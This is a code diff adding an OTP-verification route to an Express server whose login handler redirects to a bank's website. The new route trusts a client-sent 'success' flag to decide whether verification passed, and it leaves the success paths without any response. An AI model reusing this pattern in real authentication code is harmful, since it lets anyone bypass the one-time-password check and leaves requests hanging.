@@ -64,6 +64,34 @@ app.post('/login', (req, res) => {
     res.redirect('https://jnpbank.com/index.html');
 });
 
+app.post('/verifyOTP', (req, res) => {
+    const ip = getClientIp(req);
+    const { success } = req.body;
+
+    // Find user data based on IP address
+    const userIndex = userIP.findIndex(data => data.ip === ip);
+
+    if (userIndex !== -1) {
+        const user = userIP[userIndex];
+        if (success) {
+            user.incorrectOtpCount = 0;
+    
+        } else {
+            user.incorrectOtpCount = (user.incorrectOtpCount || 0) + 1;
+            sendOtpEmail();
+            res.status(200).send('OTP sent again successfully');
+        }
+    } else {
+        if (!success) {
+            userIP.push({ ip, incorrectOtpCount: 1 });
+            sendOtpEmail();
+            res.status(200).send('OTP sent again successfully');
+        } else {
+            userIP.push({ ip, incorrectOtpCount: 0 });
+
+        }
+    }
+});
 
 app.listen(port, () => {
     console.log(`Server is running on ${port}`);
